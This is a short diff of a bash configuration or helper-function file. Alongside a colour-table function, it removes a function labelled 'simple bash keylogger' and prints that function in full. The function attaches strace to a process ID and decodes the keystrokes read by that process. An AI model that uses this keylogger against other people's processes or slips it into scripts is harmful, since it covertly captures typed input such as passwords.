@@ -81,19 +81,7 @@ colours() {
   echo -e '\033[1;30m]=\u2620=[ Grey,        mirc=14, bash=\\033[1;30m'
   echo -e '\033[1;37m]=\u2620=[ Light Grey,  mirc=15, bash=\\033[1;37m'
 }
-#simple bash keylogger
-keylog() {
-  strace -p $1 -f -eread -xx 2>&1 | while read line ; do
-    char=$( echo $line | cut -f2 -d, | tr -d '"' | cut -c2- )
-    if [[ $char == *"x0d"* ]] ; then #handle CRNL
-      echo -en "\n"
-    elif [[ $char == *"x7f" ]] ; then
-      echo -en "\b"
-    else
-      echo -en "\\$char"
-    fi
-  done
-}
+
 #for extended ansi support
 echo -e "\033(U"
 #fix paths
